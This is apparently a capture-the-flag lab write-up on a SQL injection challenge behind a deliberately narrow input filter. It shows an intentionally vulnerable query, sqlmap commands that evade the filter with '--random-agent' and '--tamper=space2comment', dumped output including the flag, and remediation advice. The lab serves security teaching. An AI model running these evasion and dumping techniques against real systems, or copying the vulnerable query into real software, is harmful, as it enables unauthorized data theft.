# The Warded Door, Debrief

**Node:** `p2_6` &middot; **Flag:** `SEIYAKU{tamper_past_the_ward}` &middot; **Route:** `GET /p2/warded` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`door_knocks` table, `warded_vault` table)

New to the shared `sqlmap` flags below (`-u`, `-p`, `--batch`,
`--ignore-stdin`, `-v`, `--dbs`/`-D`/`--tables`/`-T`/`--columns`/`--dump`,
`--technique`)? They're explained in plain terms in the Automated Floor
Skip debrief's "New to sqlmap? Read this once" section and the
`--technique`/`--level`/`--risk` section further down that same debrief.
`--random-agent` and `--tamper`, both new here, are explained below.

## Root cause

The knock lookup builds its query the same way every floor in this lab
does, raw string concatenation, the result rendered directly, raw errors
echoed:

```python
# challenges/phase2.py
q = f"SELECT id, knock, meaning FROM door_knocks WHERE knock = '{knock}'"  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

Nothing about that sink is new. What's new sits in front of it, a small
input filter (a miniature WAF) that runs *before* the query and refuses
two specific things outright:

```python
_WARD_UA_BLOCK = re.compile(r"sqlmap", re.IGNORECASE)
_WARD_PHRASE_BLOCK = re.compile(r"union(\s+all)?\s+select", re.IGNORECASE)

def _ward_blocks(knock):
    if _WARD_UA_BLOCK.search(request.headers.get("User-Agent", "")):
        return True
    if knock and _WARD_PHRASE_BLOCK.search(knock):
        return True
    return False
```

When either check fires, the route never touches the database at all and
answers with an HTTP 403, the same way a real reverse-proxy WAF (a
ModSecurity rule, a cloud provider's managed ruleset) would refuse a
request before it ever reaches the application behind it.

## Why this filter is narrow on purpose

It is tempting to read "WAF" and assume every possible SQL injection
technique is now blocked. This one blocks exactly two things:

1. **Any request whose `User-Agent` contains the text "sqlmap"**, case
   insensitively. sqlmap's own default `User-Agent` header is literally
   `sqlmap/<version>#stable (http://sqlmap.org)`, so an unmodified sqlmap
   run is refused on *every single request it sends*, including its very
   first connectivity check, before it has tried a single payload.
2. **The literal phrase "union", then whitespace, then (optionally) "all"
   and more whitespace, then "select"**, case insensitively, wherever an
   actual space character sits between those words in the value being
   tested.

That's the whole rule. It says nothing about `OR`, nothing about
`EXTRACTVALUE`, nothing about `SLEEP`, nothing about `information_schema`.
Real WAF rules are very often exactly this narrow: written to catch one
specific, well-known attack signature, not a general theory of what SQL
injection looks like. Part of the actual skill this floor teaches is not
assuming "blocked" means "blocked everywhere", it means testing what,
specifically, is being matched.

## The walk (verified live against this exact seed)

**Step 0: confirm the identity check, before touching any payload at
all.** An unmodified sqlmap run, still using its own default `User-Agent`,
gets refused on the very first request:

```
sqlmap -u "http://localhost:8000/p2/warded?knock=single" -p knock --batch --ignore-stdin
```

```
[WARNING] the web server responded with an HTTP error code (403) which
could interfere with the results of the tests
[WARNING] heuristic (basic) test shows that GET parameter 'knock' might
not be injectable
[CRITICAL] all tested parameters do not appear to be injectable. ...
If you suspect that there is some kind of protection mechanism involved
(e.g. WAF) maybe you could try to use option '--tamper' (e.g.
'--tamper=space2comment') and/or switch '--random-agent'
403 (Forbidden) - 80 times
```

sqlmap's own closing message names exactly the two flags this floor is
built around. That's not a coincidence, it's sqlmap recognizing the
pattern of "every single request refused, regardless of payload" as the
signature of a User-Agent (or similarly blunt) block, and suggesting the
standard fix.

**`--random-agent`**: send a random, ordinary-looking browser `User-Agent`
(picked from a bundled list of real browser strings) with every request,
instead of sqlmap's own identifying default. It does nothing to the
payloads themselves, only to one header.

**Step 1: `--random-agent` alone already gets data out.** Once the
identity check stops firing, sqlmap's default detection proceeds normally:

```
sqlmap -u "http://localhost:8000/p2/warded?knock=single" -p knock \
    --batch --ignore-stdin --random-agent --technique=BE --dump -T warded_vault
```

```
[INFO] GET parameter 'knock' appears to be 'AND boolean-based blind -
WHERE or HAVING clause' injectable (with --string="lone")
[INFO] GET parameter 'knock' is 'MySQL >= 5.1 AND error-based - WHERE,
HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
...
[INFO] retrieved: 'SEIYAKU{tamper_past_the_ward}'
```

Boolean-blind and error-based both work with nothing more than
`--random-agent`, because neither technique's payloads ever contain the
word "union" at all, `AND 1=1`-style conditions and
`EXTRACTVALUE(1,CONCAT(...))` calls simply don't match the phrase filter.
**If this were the whole floor, `--tamper` would never come up.** It isn't:

**Step 2: forcing UNION specifically still fails.** UNION's own detection
payload looks like `UNION ALL SELECT NULL,NULL,NULL-- -`, which *is*
exactly the blocked phrase:

```
sqlmap -u "http://localhost:8000/p2/warded?knock=single" -p knock \
    --batch --ignore-stdin --random-agent --technique=U
```

```
[WARNING] GET parameter 'knock' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable. ...
If you suspect that there is some kind of protection mechanism involved
(e.g. WAF) maybe you could try to use option '--tamper' (e.g.
'--tamper=space2comment')
```

Same suggestion again, and this time it's the fix for the specific thing
that's actually blocked.

**`--tamper=space2comment`**: one of sqlmap's bundled *tamper scripts*,
small transforms that rewrite each outgoing payload before it's sent.
`--list-tampers` prints every script sqlmap ships with a one-line
description. `space2comment` replaces every literal space character in
the payload with an inline SQL comment, `/**/`. MariaDB treats `/**/`
exactly like whitespace when parsing a statement, so `UNION/**/SELECT` and
`UNION SELECT` mean the *identical* thing to the database, but the actual
bytes leaving sqlmap no longer contain a literal space between the two
words, so this filter's regex (which specifically requires `\s+`, real
whitespace, between "union" and "select") no longer matches.

**Step 3: `--technique=U` with the tamper applied.**

```
sqlmap -u "http://localhost:8000/p2/warded?knock=single" -p knock \
    --batch --ignore-stdin --random-agent --technique=U \
    --tamper=space2comment --dump -T warded_vault
```

```
[INFO] GET parameter 'knock' is 'MySQL UNION query (NULL) - 1 to 10
columns' injectable
[INFO] fetching entries for table 'warded_vault' in database 'seiyaku_p2_warded'
Database: seiyaku_p2_warded
Table: warded_vault
[1 entry]
+----+--------------+-------------------------------+
| id | label        | secret                        |
+----+--------------+-------------------------------+
| 1  | the ward-key | SEIYAKU{tamper_past_the_ward} |
+----+--------------+-------------------------------+
```

`solvers/p2_6.sh` runs all four steps above end to end against the live
stack and asserts each outcome, not just the final flag: total failure by
default, boolean/error-based already working with only `--random-agent`,
UNION alone still failing, and UNION succeeding once tampered.

## HxH analogy

A ward carved into a doorway isn't a mind, it's a fixed pattern match
against whatever a caster wrote into it, nothing more and nothing less
sensitive than exactly that pattern. A ward built to recognize one
Nen-signature and one specific gesture doesn't somehow also recognize
every other signature or every other gesture; it recognizes what it was
carved to recognize, and treats everything else as if it were never there
at all.

This floor's ward is exactly that literal. It knows one name (sqlmap's own
declared identity) and one shape of phrase ("union", a space, "select").
Show up as anyone else, or ask your question with the two key words
separated by something other than a plain space, and the ward has nothing
to react to, not because you deceived it, but because you were simply
never the thing it was built to notice.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor:

  ```python
  cur.execute("SELECT id, knock, meaning FROM door_knocks WHERE knock = %s", (knock,))
  ```

  A WAF rule is not a substitute for this, ever. It's a narrow filter
  sitting in front of a real, unfixed vulnerability; this floor's own
  boolean and error-based results prove it can be trivially routed around
  by any technique whose payload doesn't happen to match the specific
  pattern the rule was written for.
- **Don't rely on WAF signatures as your only control**, and don't assume
  a WAF's coverage is broader than what was actually written into it. A
  rule that blocks one literal phrase blocks exactly that phrase; every
  other technique, every rephrasing of the same idea, sails through
  untouched. Signature-based filtering is a speed bump for the laziest
  attacks, not a fix.
- **Least-privilege database accounts**, same as every floor in this lab:
  the knock lookup's user can read only what it needs, so `warded_vault`,
  never touched by the route's own legitimate query, shouldn't be
  reachable at all, filter or no filter.

## Isolation

This floor lives in its own database (`seiyaku_p2_warded`) and connects as
its own restricted user (`svc_p2_warded`), granted access to nothing else.
Verified live: from that user, `information_schema` shows only this
floor's own two tables (`door_knocks`, `warded_vault`), and a cross-database
read of another challenge's table is denied (`ERROR 1142`). Solving this
floor cannot surface any other challenge's data or flag. (Every
MariaDB-backed challenge in the lab is isolated the same way.)
